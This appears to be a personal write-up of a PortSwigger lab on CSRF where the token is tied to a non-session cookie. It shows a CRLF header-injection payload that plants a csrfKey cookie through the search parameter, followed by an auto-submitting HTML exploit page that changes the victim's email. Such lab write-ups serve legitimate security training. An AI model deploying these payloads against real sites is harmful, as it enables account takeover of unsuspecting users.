This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address.

# Vuln assessment

This lab is harder because the attacker's csrf cookie must be injected within the victim's browser. To do that the `search` functionality comes in handy:

![[cookie-injection.png]]

First try to inject the cookie:

![[cookie-injected.png]]

```http
/?search=testtest%0d%0aSet-Cookie:%20csrfKey=tVqbVTxl11NJvMuKmTFhJSAuL2qd248P%3b%20SameSite=None
```

*The key for the payload to work is that it injects a line break to allow the server to interpret the request parameters as another `Set-Cookie` header and the `SameSite` attribute is set to `none` this allows the cookie to be passed from the exploit server otherwise it won't get injected in the victim's browser.*

# Exploitation

Now the exploit requires two steps:
1. Injecting the cookie in the victim browser
2. Executing the csrf request

In the exploit server place the following code:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
<!-- STEP 1 & 2 -->
    <form action="https://0abf00c204fb46768199c57a000900db.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test5&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="lhzkCathjgb1my1fCftiETniIHSkogt5" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0abf00c204fb46768199c57a000900db.web-security-academy.net/?search=testtest%0d%0aSet-Cookie:%20csrfKey=tVqbVTxl11NJvMuKmTFhJSAuL2qd248P%3b%20SameSite=None" onerror="document.forms[0].submit();">
  </body>
</html>
```